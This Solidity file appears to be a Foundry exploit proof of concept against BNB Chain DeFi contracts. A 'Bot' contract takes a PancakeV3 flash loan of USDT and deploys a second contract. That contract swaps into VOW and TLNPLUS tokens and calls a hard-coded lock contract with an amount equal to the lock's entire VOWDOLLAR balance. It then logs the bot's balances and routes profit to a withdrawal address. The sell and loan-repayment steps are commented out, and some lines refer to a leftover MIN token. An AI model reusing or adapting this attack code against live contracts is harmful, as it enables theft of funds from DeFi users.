//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

import "@interfaces/IUniswapV2Router.sol";
import "@interfaces/IUniversalRouter.sol";
import "@interfaces/IUniswapV3PoolActions.sol";
import "@interfaces/IPancakeV3FlashCallback.sol";

interface ILock is IERC20 {
    function lock(uint256 time, address newOwner) external payable;
}

contract Bot is Ownable, IPancakeV3FlashCallback {
    IUniswapV3PoolActions public USDT_WBNB_POOL = IUniswapV3PoolActions(0x36696169C63e42cd08ce11f5deeBbCeBae652050);

    ERC20 public constant USDT = ERC20(0x55d398326f99059fF775485246999027B3197955);

    constructor() Ownable(msg.sender) {}

    receive() external payable {}

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata data) external {
        (uint256 usdtAmountForVow, uint256 usdtAmountForTlnplus, uint256 vowAmountForTlnplus, address withdrawAddress) =
            abi.decode(data, (uint256, uint256, uint256, address));

        bytes32 salt = keccak256(abi.encodePacked(block.timestamp));

        bytes memory constructorArgs =
            abi.encode(usdtAmountForVow, usdtAmountForTlnplus, vowAmountForTlnplus, withdrawAddress);
        bytes memory bytecode = abi.encodePacked(type(Bot2).creationCode, constructorArgs);

        address calculatedAddress = calculateAddress(salt, bytecode);

        payable(calculatedAddress).transfer(0.001 ether);
        USDT.transfer(calculatedAddress, USDT.balanceOf(address(this)));

        address bot2Address;

        assembly {
            bot2Address := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }

        // USDT.transfer(address(USDT_WBNB_POOL), borrowAmount + fee0);
    }

    function calculateAddress(bytes32 salt, bytes memory bytecode) public view returns (address) {
        return address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode)))))
        );
    }

    function main(
        uint256 usdtAmountForVow,
        uint256 usdtAmountForTlnplus,
        uint256 vowAmountForTlnplus,
        address withdrawAddress
    ) external payable onlyOwner {
        usdtAmountForVow = usdtAmountForVow * 1 ether;
        usdtAmountForTlnplus = usdtAmountForTlnplus * 1 ether;

        bytes memory params = abi.encode(usdtAmountForVow, usdtAmountForTlnplus, vowAmountForTlnplus, withdrawAddress);

        uint256 flashLoanAmount = usdtAmountForVow + usdtAmountForTlnplus;

        USDT_WBNB_POOL.flash(address(this), flashLoanAmount, 0, params);

        USDT.transfer(withdrawAddress, USDT.balanceOf(address(this)));

        console.log("Profit =>", (USDT.balanceOf(withdrawAddress)) / 1 ether);
        console.log();
    }
}

contract Bot2 is Ownable, IPancakeV3FlashCallback {
    IUniswapV2Router public constant UNISWAP_ROUTER = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IUniversalRouter public constant UNIVERSAL_ROUTER = IUniversalRouter(0x1A0A18AC4BECDDbd6389559687d1A73d8927E416);

    ERC20 public constant USDT = ERC20(0x55d398326f99059fF775485246999027B3197955);
    ERC20 public constant VOW = ERC20(0xF585B5b4f22816BAf7629AEA55B701662630397b);
    ERC20 public constant VOWDOLLAR = ERC20(0x9C23942Ca2C35e06d1d20747F33705983A18d2AB);
    ERC20 public constant TLNPLUS = ERC20(0x29280091Fa7F3ABe4739Ad5f1f7C5287feAf7736);

    uint256 public constant TLNPLUS_USDT_POOL_FEE = 10000;

    ILock public constant LOCK = ILock(0x28f21Ab6BFe5267031F4c540f8db085E26DCa031);

    constructor(
        uint256 usdtAmountForVow,
        uint256 usdtAmountForTlnplus,
        uint256 vowAmountForTlnplus,
        address withdrawAddress
    ) Ownable(msg.sender) {
        // console.log("Before buy");
        // console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        // console.log("Pool MIN balance =>", MIN.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        // console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(USDT), address(VOW), usdtAmountForVow, address(this)
        );

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(VOW), address(TLNPLUS), vowAmountForTlnplus, address(this)
        );

        if (usdtAmountForTlnplus > 0) {
            swapExactIn(address(VOW), address(TLNPLUS), TLNPLUS_USDT_POOL_FEE, usdtAmountForTlnplus);
        }

        console.log("After buy");
        console.log("Before lock");
        // console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        // console.log("Pool MIN balance =>", MIN.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        console.log("Bot VOW balance =>", VOW.balanceOf(address(this)) / 1 ether);
        // console.log("Bot MIN balance =>", MIN.balanceOf(address(this)) / 1 ether);
        console.log();

        uint256 lockAmount = VOWDOLLAR.balanceOf(address(LOCK)) * 100 / 100;

        console.log("Lock amount =>", lockAmount / 1 ether);
        console.log();

        TLNPLUS.approve(address(LOCK), type(uint256).max);
        VOW.approve(address(LOCK), type(uint256).max);

        LOCK.lock{value: 0.001 ether}(lockAmount, address(TLNPLUS));

        console.log("After lock");
        console.log("Before sell");
        // console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        // console.log("Pool MIN balance =>", MIN.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        console.log("Bot VOW balance =>", VOW.balanceOf(address(this)) / 1 ether);
        // console.log("Bot MIN balance =>", MIN.balanceOf(address(this)) / 1 ether);
        console.log();

        // swapExactTokensForTokensSupportingFeeOnTransferTokens(
        //     address(MIN), address(USDT), MIN.balanceOf(address(this)), address(this)
        // );

        // console.log("After sell");
        // console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        // console.log("Pool MIN balance =>", MIN.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        // console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        // console.log("Bot MIN balance =>", MIN.balanceOf(address(this)) / 1 ether);
        // console.log();

        // require(USDT.balanceOf(address(this)) > borrowAmount + fee0, "No profit");

        // USDT.transfer(address(USDT_WBNB_POOL), borrowAmount + fee0);
    }

    receive() external payable {}

    function withdrawERC20(address erc20, address to) public onlyOwner {
        IERC20(erc20).transfer(to, IERC20(erc20).balanceOf(address(this)));
    }

    function withdrawETH(address payable to) public onlyOwner {
        to.transfer(address(this).balance);
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        address recipient
    ) public {
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        UNISWAP_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, recipient, block.timestamp
        );
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), 0);
    }

    function swapExactIn(address tokenIn, address tokenOut, uint256 fee, uint256 amountIn) public {
        bytes memory commands = abi.encodePacked(uint8(Commands.V3_SWAP_EXACT_IN));
        bytes memory path = abi.encodePacked(tokenIn, fee, tokenOut);
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(address(this), amountIn, 0, path, false);
        UNIVERSAL_ROUTER.execute(commands, inputs, block.timestamp);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata data) external {
        (uint256 usdtAmountForVow, uint256 usdtAmountForTlnplus, uint256 vowAmountForTlnplus) =
            abi.decode(data, (uint256, uint256, uint256));

        // console.log("Before buy");
        // console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        // console.log("Pool MIN balance =>", MIN.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        // console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(USDT), address(VOW), usdtAmountForVow, address(this)
        );

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(VOW), address(TLNPLUS), vowAmountForTlnplus, address(this)
        );

        if (usdtAmountForTlnplus > 0) {
            swapExactIn(address(VOW), address(TLNPLUS), TLNPLUS_USDT_POOL_FEE, usdtAmountForTlnplus);
        }

        console.log("After buy");
        console.log("Before lock");
        // console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        // console.log("Pool MIN balance =>", MIN.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        console.log("Bot VOW balance =>", VOW.balanceOf(address(this)) / 1 ether);
        // console.log("Bot MIN balance =>", MIN.balanceOf(address(this)) / 1 ether);
        console.log();

        uint256 lockAmount = VOWDOLLAR.balanceOf(address(LOCK)) * 100 / 100;

        console.log("Lock amount =>", lockAmount / 1 ether);
        console.log();

        TLNPLUS.approve(address(LOCK), type(uint256).max);
        VOW.approve(address(LOCK), type(uint256).max);

        LOCK.lock{value: 0.001 ether}(lockAmount, address(TLNPLUS));

        console.log("After lock");
        console.log("Before sell");
        // console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        // console.log("Pool MIN balance =>", MIN.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        console.log("Bot VOW balance =>", VOW.balanceOf(address(this)) / 1 ether);
        // console.log("Bot MIN balance =>", MIN.balanceOf(address(this)) / 1 ether);
        console.log();

        // swapExactTokensForTokensSupportingFeeOnTransferTokens(
        //     address(MIN), address(USDT), MIN.balanceOf(address(this)), address(this)
        // );

        // console.log("After sell");
        // console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        // console.log("Pool MIN balance =>", MIN.balanceOf(address(USDT_MIN_PAIR)) / 1 ether);
        // console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        // console.log("Bot MIN balance =>", MIN.balanceOf(address(this)) / 1 ether);
        // console.log();

        // require(USDT.balanceOf(address(this)) > borrowAmount + fee0, "No profit");

        // USDT.transfer(address(USDT_WBNB_POOL), borrowAmount + fee0);
    }
}
